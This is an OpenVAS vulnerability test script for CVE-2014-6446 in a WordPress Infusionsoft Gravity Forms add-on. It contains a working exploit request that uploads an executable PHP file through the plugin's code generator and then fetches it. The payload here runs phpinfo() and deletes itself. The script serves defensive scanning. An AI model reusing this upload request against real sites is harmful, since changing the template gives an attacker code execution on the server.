###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wp_infusionsoft_gravity_forms_file_upload_vuln.nasl 13994 2019-03-05 12:23:37Z cfischer $
#
# Wordpress Infusionsoft Gravity Forms Add-on Arbitrary File Upload Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804769");
  script_version("$Revision: 13994 $");
  script_cve_id("CVE-2014-6446");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2019-03-05 13:23:37 +0100 (Tue, 05 Mar 2019) $");
  script_tag(name:"creation_date", value:"2014-09-29 17:24:16 +0530 (Mon, 29 Sep 2014)");

  script_name("Wordpress Infusionsoft Gravity Forms Add-on Arbitrary File Upload Vulnerability");

  script_tag(name:"summary", value:"This host is installed with Wordpress
  Infusionsoft Gravity Forms Add-on and is prone to remote file upload
  vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request
  and check whether it is is able to upload file or not.");

  script_tag(name:"insight", value:"Flaw is due to the plugin failed to
  restrict access to certain files.");

  script_tag(name:"impact", value:"Successful exploitation will allow an
  unauthenticated remote attacker to upload files in an affected site.");

  script_tag(name:"affected", value:"WordPress Infusionsoft Gravity Forms Add-on
  version 1.5.3 to 1.5.10");

  script_tag(name:"solution", value:"Upgrade to version 1.5.11 or later.");
  script_tag(name:"solution_type", value:"VendorFix");
  script_xref(name:"URL", value:"http://research.g0blin.co.uk/cve-2014-6446");
  script_xref(name:"URL", value:"https://wordpress.org/plugins/infusionsoft/changelog/");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");

if(!http_port = get_app_port(cpe:CPE))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:http_port))
  exit(0);

if(dir == "/")
  dir = "";

host = http_host_name(port:http_port);

url = dir + '/wp-content/plugins/infusionsoft/Infusionsoft/utilities/code_generator.php';
wpReq = http_get(item:url, port:http_port);
wpRes = http_keepalive_send_recv(port:http_port, data:wpReq, bodyonly:TRUE);

if(">Code Generator<" >< wpRes &&
   "tool will generate a file based on the information you put" >< wpRes)
{

  vtstrings = get_vt_strings();
  fileName = vtstrings["lowercase_rand"] + ".php";

  postData = string('fileNamePattern=out%2F', fileName,
                    '&fileTemplate=%3C%3Fphp+phpinfo%28%29%3B+unlink%28+%22',
                    fileName, '%22+%29%3B+%3F%3E');

  sndReq = string("POST ", url, " HTTP/1.1\r\n",
                  "Host: ", host, "\r\n",
                  "Content-Type: application/x-www-form-urlencoded\r\n",
                  "Content-Length: ", strlen(postData), "\r\n\r\n",
                  postData, "\r\n");
  rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);

  if('Generating Code' >< rcvRes && 'Creating File:' >< rcvRes)
  {

    url = dir + '/wp-content/plugins/infusionsoft/Infusionsoft/utilities/out/' + fileName;
    if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
       pattern:">phpinfo\(\)<", extra_check:">PHP Documentation<"))
    {
      report = report_vuln_url(port:http_port, url:url);
      security_message(port:http_port, data:report);
      exit(0);
    }
  }
  exit(99);
}

exit(0);